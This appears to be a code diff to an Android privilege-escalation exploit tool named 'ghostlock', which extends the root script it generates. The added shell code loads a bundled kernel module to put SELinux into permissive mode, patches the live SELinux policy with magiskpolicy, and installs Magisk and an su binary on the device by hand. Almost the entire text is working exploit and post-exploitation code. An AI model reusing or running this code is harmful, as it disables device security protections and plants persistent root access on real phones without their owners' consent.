@@ -272,9 +272,10 @@ namespace ghostlock::attack {
     }
 
     void write_root_script(void) {
-        /* The SELinux enforce-write block adds ~2.5 KiB; 20 KiB keeps the
-         * script well clear of the truncation guard below. */
-        std::string script(20480, '\0');
+        /* The SELinux enforce-write block adds ~2.5 KiB and the Magisk handoff
+         * another ~2.5 KiB; 32 KiB keeps the script well clear of the
+         * truncation guard below. */
+        std::string script(32768, '\0');
         support::UniqueFd sfd(
             open((config::runtime_config_snapshot().root_script_path.c_str()), O_WRONLY | O_CREAT | O_TRUNC, 0755));
         if (!sfd.valid()) {
@@ -305,6 +306,14 @@ namespace ghostlock::attack {
             "case \"$MODE_TEXT\" in *noinstrument*) NO_INSTR=1 ;; esac\n"
             "SAFE_MODE=%d\n"
             "VRKO_SELINUX_BLOCK='%s'\n"
+            /* The root manager the exploit installs. kernelsu late-loads ksud;
+             * magisk runs the userspace late install (module pipeline or a
+             * bench switch on a W1 pipeline). Both run while permissive: the
+             * live policy patch needs `security:security load_policy`, which
+             * no shipped domain holds. */
+            "HANDOFF='%s'\n"
+            "MAGISK_BIN='%s'\n"
+            "MODULE_PATH='%s'\n"
             "KSUD=\"$HOME_DIR/ksud\"\n"
             "echo \"[*] root script start uid=$(id -u) euid=$(id -u)\" >\"$LOG\"\n"
             "chmod 644 \"$LOG\" 2>/dev/null\n"
@@ -367,6 +376,66 @@ namespace ghostlock::attack {
             "    st_caps=\"$st_caps ${f##*/}=$(cat \"$f\" 2>/dev/null)\"\n"
             "  done\n"
             "  echo \"enforce=${st_enforce:-unreadable} checkreqprot=${st_cr:-n/a} caps:${st_caps:- unreadable}\"\n"
+            "}\n"
+            /* The Magisk handoff: reproduce magiskinit by hand. The permissive
+             * window is opened by W1 (dirtyfrag/ghostlock pipelines) or by the
+             * bundle's module (module pipeline), so the live policy patch is
+             * allowed; everything that needs the pre-patch permissions runs
+             * here, and the caller restores enforcing afterwards. */
+            "magisk_handoff() {\n"
+            "  mg_m=\"${MAGISKTMP:-/debug_ramdisk}\"\n"
+            "  echo \"[*] magisk: bin=$MAGISK_BIN tmp=$mg_m script_module=${MODULE_PATH:-none}\" >>\"$LOG\"\n"
+            "  mkdir -p \"$mg_m\" /data/adb/magisk /data/adb/modules /data/adb/post-fs-data.d /data/adb/service.d 2>>\"$LOG\"\n"
+            "  if ! grep -q \" $mg_m \" /proc/mounts 2>/dev/null; then\n"
+            "    mount -t tmpfs -o mode=0755 tmpfs \"$mg_m\" 2>>\"$LOG\" || \\\n"
+            "      echo '[!] magisk: tmpfs mount failed; using the directory' >>\"$LOG\"\n"
+            "  fi\n"
+            "  for f in magisk magisk32 magiskboot magiskinit magiskpolicy busybox bootctl init-ld; do\n"
+            "    [ -f \"$MAGISK_BIN/$f\" ] || continue\n"
+            "    cp -f \"$MAGISK_BIN/$f\" \"$mg_m/$f\" 2>>\"$LOG\"\n"
+            "    cp -f \"$MAGISK_BIN/$f\" /data/adb/magisk/$f 2>>\"$LOG\"\n"
+            "    chmod 755 \"$mg_m/$f\" /data/adb/magisk/$f 2>/dev/null\n"
+            "  done\n"
+            "  ln -sf \"$mg_m/magisk\" \"$mg_m/su\"\n"
+            "  ln -sf \"$mg_m/magisk\" \"$mg_m/resetprop\"\n"
+            "  ln -sf \"$mg_m/magiskpolicy\" \"$mg_m/supolicy\"\n"
+            "  mkdir -p \"$mg_m/.magisk/device\" \"$mg_m/.magisk/worker\" 2>>\"$LOG\"\n"
+            "  touch \"$mg_m/.magisk/config\" 2>/dev/null\n"
+            "  mg_pol=''\n"
+            "  for p in /vendor/etc/selinux/precompiled_sepolicy /system/etc/selinux/precompiled_sepolicy; do\n"
+            "    [ -f \"$p\" ] && { mg_pol=\"$p\"; break; }\n"
+            "  done\n"
+            "  if [ -x \"$mg_m/magiskpolicy\" ]; then\n"
+            "    if [ -n \"$mg_pol\" ]; then\n"
+            "      \"$mg_m/magiskpolicy\" --load \"$mg_pol\" --live --magisk >>\"$LOG\" 2>&1\n"
+            "      MG_POLICY_RC=$?\n"
+            "    else\n"
+            /* No monolithic precompiled policy on this ROM: patch the live
+             * policy (already the fixup's repacked one). */
+            "      \"$mg_m/magiskpolicy\" --live --magisk >>\"$LOG\" 2>&1\n"
+            "      MG_POLICY_RC=$?\n"
+            "    fi\n"
+            "    echo \"MAGISK-PHASE policy rc=$MG_POLICY_RC source=${mg_pol:-live}\" >>\"$LOG\"\n"
+            "  else\n"
+            "    MG_POLICY_RC=1\n"
+            "    echo '[!] magisk: magiskpolicy missing' >>\"$LOG\"\n"
+            "  fi\n"
+            "  if [ -x \"$mg_m/magisk\" ]; then\n"
+            "    \"$mg_m/magisk\" --post-fs-data >>\"$LOG\" 2>&1\n"
+            "    echo \"MAGISK-PHASE post-fs-data rc=$?\" >>\"$LOG\"\n"
+            "  fi\n"
+            "  mg_pid=''\n"
+            "  for i in $(seq 1 30); do\n"
+            "    mg_pid=$(pidof magiskd 2>/dev/null)\n"
+            "    [ -n \"$mg_pid\" ] && break\n"
+            "    sleep 0.1\n"
+            "  done\n"
+            "  echo \"[*] magiskd=${mg_pid:-none}\" >>\"$LOG\"\n"
+            "  if [ -z \"$mg_pid\" ]; then return 3; fi\n"
+            "  [ -x \"$mg_m/magisk\" ] && \"$mg_m/magisk\" --service >>\"$LOG\" 2>&1\n"
+            "  [ -x \"$mg_m/magisk\" ] && \"$mg_m/magisk\" --boot-complete >>\"$LOG\" 2>&1\n"
+            "  echo \"MAGISK-SUMMARY magiskd=$mg_pid enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null) policy=${mg_pol:-live} policy_rc=${MG_POLICY_RC:-na} su=$(ls -l \\\"$mg_m/su\\\" 2>/dev/null)\"\n"
+            "  return 0\n"
             "}\n"
             "if [ \"$(id -u)\" -ne 0 ]; then\n"
             "  echo '[!] temp su unavailable; aborting' >>\"$LOG\"\n"
@@ -577,6 +646,23 @@ namespace ghostlock::attack {
             "  CONFIG=$(printf '\\\\0%%03o' \"$((CONFIG | 192))\" || return 1)\n"
             "  printf '%%b' \"$CONFIG\" | dd of=\"$POLICY\" bs=1 seek=23 count=1 conv=notrunc\n"
             "}\n"
+            /* The module pipeline has no W1: load the bundled module before the
+             * fixup, so the policy read/load below (and the Magisk patch) run
+             * while the module holds the device permissive. On a W1 pipeline
+             * MODULE_PATH is empty and this is a no-op. */
+            "if [ -n \"$MODULE_PATH\" ]; then\n"
+            "  echo \"[*] module: loading $MODULE_PATH\" >>\"$LOG\"\n"
+            "  if insmod \"$MODULE_PATH\" >>\"$LOG\" 2>&1; then\n"
+            "    echo '[+] module loaded' >>\"$LOG\"\n"
+            "  else\n"
+            "    echo '[!] module load failed' >>\"$LOG\"\n"
+            "  fi\n"
+            "  for i in $(seq 1 30); do\n"
+            "    [ \"$(cat /sys/fs/selinux/enforce 2>/dev/null)\" = 0 ] && break\n"
+            "    sleep 0.1\n"
+            "  done\n"
+            "  echo \"[*] enforce after module=$(cat /sys/fs/selinux/enforce 2>/dev/null)\" >>\"$LOG\"\n"
+            "fi\n"
             "FIXUP_RC=1\n"
             "for i in $(seq 1 10); do\n"
             "  echo \"[*] fixup: attempt $i\" >>\"$LOG\"\n"
@@ -642,6 +728,18 @@ namespace ghostlock::attack {
             "fi\n"
 
             "if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
+            "if [ \"$HANDOFF\" = magisk ]; then\n"
+            /* The permissive window is open (W1 did it, or the module did). */
+            "  magisk_handoff\n"
+            "  MAGISK_READY=$?\n"
+            "  dump_debug\n"
+            "  DUMP_DONE=1\n"
+            "  restore_enforce magisk-handoff\n"
+            "  if [ \"$MAGISK_READY\" -ne 0 ]; then\n"
+            "    restore_enforce magisk-not-ready\n"
+            "    exit 1\n"
+            "  fi\n"
+            "else\n"
             "# load_policy ok: late-load (module init re-enforces); already-loaded restores below\n"
             "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
             "  KSU_ALREADY=1\n"
@@ -727,6 +825,7 @@ namespace ghostlock::attack {
             "  restore_enforce ksu-not-loaded\n"
             "  exit 1\n"
             "fi\n"
+            "fi\n"
             "else\n"
             "  echo '[!] fixup failed; restoring enforcing' >>\"$LOG\"\n"
             "  dump_debug\n"
@@ -738,6 +837,9 @@ namespace ghostlock::attack {
             (config::runtime_config_snapshot().ksu_log_path.c_str()),
             session::g_exploit_session.profile.safe_mode() ? 1 : 0,
             config::vr_ko_mode_name(config::runtime_config_snapshot().vrko_selinux_block),
+            config::runtime_config_snapshot().handoff.c_str(),
+            config::runtime_config_snapshot().magisk_bin.c_str(),
+            config::runtime_config_snapshot().module_path.c_str(),
             (config::runtime_config_snapshot().debug_dir.c_str()));
         if (n < 0 || n >= static_cast<int32_t>(script.size())) {
             pr_warning("root script too long\n");
